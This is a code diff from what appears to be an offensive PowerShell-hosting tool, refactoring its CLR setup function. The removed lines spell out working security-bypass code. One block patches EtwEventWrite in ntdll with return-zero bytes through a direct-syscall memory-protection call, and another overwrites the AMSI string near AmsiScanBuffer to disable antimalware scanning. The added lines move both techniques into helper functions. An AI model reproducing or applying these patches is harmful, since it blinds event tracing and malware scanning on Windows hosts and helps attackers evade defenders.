@@ -535,56 +535,10 @@ void* findStringInMemory(const char* target, void* startAddress, int lenght)
 int PwSh::initCLR()
 {
     // Patch EtwEventWrite
-    bool isPatchEtw = true;
-    if(isPatchEtw)
-    {
-        void * pEventWrite = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
-        
-        HANDLE hProc=(HANDLE)-1;
-
-        DWORD oldprotect = 0;
-        // VirtualProtect(pEventWrite, 1024, PAGE_READWRITE, &oldprotect);
-
-        HANDLE hProcess = GetCurrentProcess();
-        SIZE_T dwSize = 1024;
-        Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, PAGE_READWRITE, &oldprotect);
-
-        #ifdef _WIN64
-            // memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4);         // xor rax, rax; ret
-            char patch[] = "\x48\x33\xc0\xc3"; // xor rax, rax; ret
-            int patchSize = 4;
-        #else
-            // memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);        // xor eax, eax; ret 14
-            char patch[] = "\x33\xc0\xc2\x14\x00"; // xor eax, eax; ret 14
-            int patchSize = 5;
-        #endif
-        
-         WriteProcessMemory(hProc, pEventWrite, (PVOID)patch, patchSize, nullptr);
-
-        // VirtualProtect(pEventWrite, 1024, oldprotect, &oldprotect);
-        Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, oldprotect, &oldprotect);
-    }
+    patchEtw();
 
     // Patch AMSI
-    HMODULE hAmsi = LoadLibrary("amsi.dll");
-    std::string target = "AMSI";
-    BYTE* baseAddress = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
-    int lenght = 0x100;
-
-    void* address = findStringInMemory(target.c_str(), (void*)baseAddress, lenght);
-    if(address)
-    {
-        DWORD oldprotect = 0;
-        VirtualProtect(address, 1024, PAGE_READWRITE, &oldprotect);
-
-        std::string patch = "ASMI";
-        memcpy( (void*)(address), (void*)(patch.c_str()), patch.size());
-
-        VirtualProtect(address, 1024, oldprotect, &oldprotect);
-    }
-    else
-    {
-    }
+    patchAmsiPowershell();
 
     HMODULE hMscoree = LoadLibrary("mscoree.dll");
 
